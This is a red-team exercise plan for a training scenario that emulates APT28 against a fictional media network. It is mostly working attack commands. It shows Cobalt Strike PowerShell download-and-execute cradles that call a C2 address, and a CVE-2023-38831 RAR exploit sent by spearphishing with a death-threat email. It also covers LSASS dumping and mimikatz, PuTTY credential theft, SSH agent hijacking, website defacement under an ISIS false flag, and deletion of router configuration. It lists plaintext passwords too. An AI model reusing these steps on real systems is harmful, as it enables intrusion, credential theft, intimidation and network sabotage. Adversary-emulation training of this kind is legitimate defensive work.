# Plan

# MECT Scenario Overview: APT 28 Fancy Bear 

Author: Petitt
___

Story:
US media group BuzzHub Media has been writing articles critical of the Russian Invasion of Ukraine. Journalist Rachelle.Conley has received mysterious death threats from CyberCaliphate (Islamic State militants) telling her to write more about the greatness of ISHD or else and that the CC know everything about her spouse and children. Also in the death threat there is a pdf that their journalistic curiosity can't ignore.

##### Table of Contents
- [ ] [[Plan#Phase 1 Initial Access|Phase 1 Initial Access]]
- [ ] [[Plan#PrivEsc|PrivEsc]]
- [ ] [[Plan#Drop Persistence|Drop Persistence]]

- [ ] [[Plan#Phase 2 1st Lat Move to y.white|Phase 2 1st Lat Move to y.white]]
- [ ] [[Plan#2nd Lat Move to web server|2nd Lat Move to web server]]
- [ ] [[Plan#Deface Web Server|Deface Web Server]]

- [ ] [[Plan#Phase 3 SSH-Agent Forwarding|Phase 3 SSH-Agent Forwarding]]

- [ ] [[Plan#Phase 4 Degrade Vyos|Phase 4 Degrade Vyos]]
- [ ] [[Plan#Shut Down Routers|Shut Down Routers]]


__________

# Phase 1: Initial Access

Cobalt Strike -- Spearphishing -- Microsoft exchange -- Rachelle.Conley

1. Turn on Cobalt Strike
	1. Create a Listener
	2. Create Scripted Web Delivery (S) Attack
2. Create Rar file
	1. Use photos for PDF's
3. Send e-mail via Swaks
4. White Cell opening e-mail in PAO-S2-0

1. Cobalt Strike:
```
sudo ./teamserver 30.0.0.10 password
```

```
./cobaltstrike
```
![[Pasted image 20240314130604.png]]

Making a Listener
![[Pasted image 20240314130721.png]]
![[Pasted image 20240314130834.png]]

Creating a Scripted Web Delivery (S) Attack
![[Pasted image 20240314130931.png]]
![[Pasted image 20240314130958.png]]

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://188.64.30.95:80/a'))"
```

![[Pasted image 20240314131308.png]]
![[Pasted image 20240314131324.png]]

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://188.64.30.95:8080/a'))"
```

2. Creating the Rar file:
```
unzip CVE-2023-38831.zip
```

```cobaltstrike.bat
vim cobaltstrike.bat

#paste in your Scripted Web Delivery (S) Attack
```


Now we need to use unix2dos on the file
```
unix2dos cobaltstrike.bat
```

Make sure to add the photos from tools. 

```
python exploit.py
[Enter the bait file name:] photos.pdf
[Enter the script file name:] cobaltstrike.bat
[Enter the output RAR file name:] PROOF.rar
[Exploit generated successfully as 'PROOF.rar']
```


using swaks
```
swaks --to rachelle.conley@public.pao.mil --from unknown@unknown.com --header 'Subject: OPEN ASAP' --body "WE KNOW WHO YOU ARE. WE KNOW WHO YOUR FAMILY IS. WE WILL KILL YOU ALL. HERE IS PROOF TO SHOW OUR RESOLVE." --attach-type application/vnd.rar --attach PROOF.rar --server 155.8.1.2
```
> [!Danger] Notes
> Note that the --server 155.8.1.2 is the ip address of the pao-smtp server. 
> Change this according to the correct enclave, correct ip address, etc. 
> 
> Also note that setting the domain as public.pao.mil may throw an error saying something along the lines of ..."unable to relay recipient in non-accepted domain"
> 
> This can be fixed by changing the domain to pao.mil for both the sender and the receiver

Log into PAO-S2-0 
>[!info]
>Username: Rachelle.Conley
Password: T#n#3#N9#h+K

![[20240314-1847-26.8077652.mp4]]

You should now have a beacon in CS for PAO-S2-0
> [!Danger] Notes
> If defender is turned on and the photos.pdf.cmd gets blocked, white-card in and turn off real time monitoring *for now*

[[Plan#Table of Contents|Return to Table of Contents]]
________________

## PrivEsc

Looks like an Administrator was tired of putting in their complex password multiple times and saved their credentials to the box.

```
powershell cmdkey /list
```
![[Pasted image 20240314154551.png]]

We can use the saved creds to privilege escalate. Here we will use our Scripted Web Attack Admin/System Beacon that we created earlier

1. In Kali terminal
```
pwsh # open powershell within kali
```

>[!Warning]- 
>Powershell Escape Characters
>Inside powershell you can escape characters with the \` character. You will have 2. The first placed BEFORE the `"IEX` and the second BEFORE your final ending `""))`
>

```
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("powershell.exe -nop -w hidden -c `"IEX ((new-object net.webclient).downloadstring('http://188.64.30.95:8080/a'))`""))
```

This should spit out a Base64 String for you to enter into Cobalt Strike

Inside your beacon we will create a variable for our Base64 string. The reason we need this is because Windows Credential Manager doesn't allow runas long commands.

```
powershell $b="cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA4AC4ANgA0AC4AMwAwAC4AOQA1ADoAOAAwADgAMAAvAGEAJwApACkAIgA=" ; runas /savecred /user:administrator "powershell.exe -EncodedCommand $b"
```

Congratulations! You should now have a beacon as Local Administrator on PAO-S2-0

[[Plan#Table of Contents|Return to Table of Contents]]
___________

## Drop Persistence


INCOMPLETE: I want to do lojax in the future ..... butttt that might be a bit beyond me atm

Maybe Wells or McCann will help me?

> [!Notes] Shin Notes
> Maybe we can use reflective PE injection?

Follow-up on Shin Notes
**Reflective PE Injection**
```powershell
	powershell -ep bypass
	(new-object system.net.webclient).downloadstring('http://domain-of-our-c2/name-of-reflective-PE-Injection-Powershell-file.ps1') | iex
	# This would write the file to disk, which defeats the purpose of stealth?
	(new-object system.net.webclient).downloadfile('http://domain-of-our-c2/name-of-invisireg.exe', 'name-of-output.exe')
	# Or, can you just save the downloaded file to a variable and call it to [IO.File]::ReadAllBytes?
	# $Tomatoes = (new-object system.net.webclient).downloadfile('http://domain-of-our-c2/name-of-invisireg.exe')
	$Bananas = [IO.File]::ReadAllBytes('name-of-output.exe') 
	Invoke-ReflectivePEInjection -PEBytes $Bananas -ExeArgs "Arg1 Arg2 Arg3 Arg4"
```

____
## Phase 2: 1st Lat Move to y.white

This is Shared Workstation --- Storyboard y.white logged on once to r.conley

>[!Note]
>This is the way Fancy Bear does it

**Using Administrator Beacon**
Dump lsass using comsvcs.dll

Extract passwords from lsass using comsvcs.dll
```Powershell
powershell Get-Process lsass

#You can use any file path for placement
powershell .\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID C:\Users\Rachelle.Conley\Downloads\lsass.dmp full
```

In cobalt Strike
```
download C:\Users\Rachelle.Conley\Downloads\lsass.dmp
```

To view it just use pypykatz -- If you didn't do the dependencies you will need to do it now

```
pypykatz lsa minidump lsass.dmp
```
![[Pasted image 20240314155852.png]]
f59e3036d37fe6a07adc49b8fd4da501

>[!Note] 
>An easier way is just using Cobalt Strike but we want to leave APT28 artificats.

In our Admin Beacon within Cobalt Strike we can run mimikatz to  get the NTLM hash of Yvette.White

```
mimikatz sekurlsa::logonpasswords
```

Lateral Movement:
Move to yvette.white s3 via psexec

```
jump psexec PAO-S3-0 Initial Beacon
```

And now we automatically own PAO-S3-0

[[Plan#Table of Contents|Return to Table of Contents]]
__________

## 2nd Lat Move to web server

Yvette.White will be in charge of the webserver and is a Local Admin

Since we are System, we will need to get Y.White's sid to find her clear text PuTTY creds.
```
shell wmic useraccount where name="Yvette.White" get sid
```

putty creds
```
powershell reg query hku\<result-from-above>\software\simontatham\putty\sessions
```
![[Pasted image 20240314160336.png]]

We can ssh inside our PAO-S3-0 session
```
ssh 155.8.1.10 y.white Spring2024
```

[[Plan#Table of Contents|Return to Table of Contents]]
______

## Deface Web Server

Lucky us we don't even have to Priv Esc
```
shell sudo -l
```

We are going to use the false flag technique and blame CyberCaliphate or otherwise known as The Islamic State hacking Division ISHD

Move to deface website and blame CyberCaliphate

We are going to change the website homepage from:
/var/www/html/public
to
/var/www/html/lib

1. Create new Directory in /var/www/html/lib
```
shell sudo mkdir /var/www/html/lib
```

2. Now we will replace the website file path.
```
cd /etc/apache2/sites-enabled

shell cat 000-default.conf

shell sudo sed -i '0,/public/{s/public/lib/}' 000-default.conf
```
![[Pasted image 20240314161253.png]]

Now let's create our fake WebSite in /tmp

Copy and Paste this into a file /tmp/index.php
```index.php
<!DOCTYPE html>
<html>
<body>

<?php

echo "AMERICAN SOLDIERS, WE ARE COMING, WATCH YOUR BACK. ISIS. CyberCaliphate";
echo "<br>";
echo "<br>";
echo "The CyberCaliphate under the auspices of ISIS continues its CyberJihad. While the US and its satellites try to kill our brothers we broke into your networks and personal devices and know everything about you. You'll see no mercy. ISIS is already here, we are in your PCs, in each military base. We won't stop! We know everything about you, your wives and children. U.S. soldiers! We're watching you!";
?>

</body>
</html>

```
![[Pasted image 20240314162208.png]]

Uploading
```
cd /tmp
upload /tmp/index.php
shell sudo mv index.php /var/www/html/lib
cd /var/www/html/lib
shell sudo chmod 644 index.php
```

[(1) What is the CyberCaliphate? - National | Globalnews.ca](https://globalnews.ca/news/1769146/what-is-the-cybercaliphate/)
![[Pasted image 20240226154341.png]]

then need to use command to restart the server for the changes to take place
```
systemctl restart apache2
```

Now you can view the webpage and voila! The website is defaced!

[[Plan#Table of Contents|Return to Table of Contents]]
___________
## Phase 3: SSH-Agent Forwarding

When logged into PAO-WEB an IT admin from S6 will SSH into the webserver to try to fix the website. We will hijack their ssh connection and use it to follow them back to their box.

After Defacing the website we will have the white cell ssh into t.todd pao-web using this command
```
ssh -i .\keys t.todd@155.8.1.10
```

Once they have logged in or you have logged in as white cell we will go back to our cobalt strike ssh session

We will search for t.todd's ssh session
```
shell ps aux | grep ssh 

shell pstree -p t.todd | grep ssh

shell sudo cat /proc/<pid-of-bash-from-above>/environ | tr '\0' '\n' | grep "SSH"

shell sudo SSH_AUTH_SOCK=/tmpssh-RANDOMstring/agent.number ssh-add -l

shell sudo SSH_AUTH_SOCK=/tmpssh-RANDOMstring/agent.number ssh terry.todd@155.8.8.2 hostname
```

![[24_ME_03/attachments/Pasted image 20240312153448.png]]

Boom we are now able to run commands on pao-s6-0 as terry.todd, but we aren't able to become him just yet. We will need to execute a beacon using a scripted web delivery.

```
shell SSH_AUTH_SOCK=/tmp/ssh-AfRMXo8OAo/agent.4682 ssh -o StrictHostKeyChecking=no terry.todd@155.8.8.2 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://188.64.30.95:80/a'))"
```

And boom you should now have a beacon for terry.todd 
If we didn't throw a beacon down we would lose the connection as soon as the target closed their active session


Now let's ssh into the routers.

Terry Todd probably uses powershell to ssh into the router. i mean he did for the pao-webserver right?
```
powershell gci (Get-PSReadlineOption).HistorySavePath

powershell cat C:\Users\terry.todd\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Whoaaa Looks like terry.todd has been logging into something called vyatta@155.8.8.1. What can we do with that?
![[Pasted image 20240314163556.png]]


Since we can see that Terry.Todd is using his authorized key we can download the key and use it ourselves.
```
cd C:\Users\terr.todd\.ssh

download keys # putting in /tmp

ssh-key 155.8.8.1 vyatta /tmp/keys
```

Congratulations --- you now are on the router.

[[Plan#Table of Contents|Return to Table of Contents]]
_____________
## Phase 4: Degrade Vyos

Slow down routers 

Configure physical interface speed to 100 Mbit/s
```
shell sed -i 's/speed auto/speed 100/g' /config/config.boot
```

```
shell sudo reboot
```

>[!note] Persistent Pub Key
>The only problem with this is that terry.todd's pub key gets deleted -- Eventually would be nice to know how to add his pub key to the config/config.boot file so it stays. For now I will white cell terry.todd adding it back to he can check on the router.


[[Plan#Table of Contents|Return to Table of Contents]]
____
## Shut Down Routers


End state is to erase vyos router firmware --- delete "/config/config.boot" to create a black out within the company 

```
shell sudo rm /config/config.boot
```

```
shell sudo reboot
```

[[Plan#Table of Contents|Return to Table of Contents]]
